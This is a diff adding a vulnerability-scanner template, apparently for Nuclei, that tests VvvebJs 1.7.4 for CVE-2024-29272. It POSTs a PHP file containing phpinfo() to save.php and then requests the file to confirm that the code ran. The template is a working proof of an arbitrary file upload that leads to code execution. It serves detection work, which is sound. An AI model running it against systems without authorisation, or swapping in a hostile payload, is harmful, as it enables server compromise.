@@ -1,0 +1,44 @@
+id: vvvebjs-cve-2024-29272
+info:
+  name: VvvebJs 1.7.4 Arbitrary File Upload Vulnerability (CVE-2024-29272)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    VvvebJs 1.7.4 is vulnerable to an arbitrary file upload vulnerability, allowing attackers to upload malicious files to the server.
+  tags: file-upload,CVE-2024-29272
+
+variables:
+  filename: "{{to_lower(rand_text_alphanumeric(10))}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/save.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: |
+      file=demo%2Flanding%2F{{filename}}.php&html=<?php%20phpinfo();%20?>
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "File saved"
+      - type: status
+        status:
+          - 200
+
+  - id: validate-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/demo/landing/{{filename}}.php"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "phpinfo"
+          - "PHP Version"
+      - type: status
+        status:
+          - 200
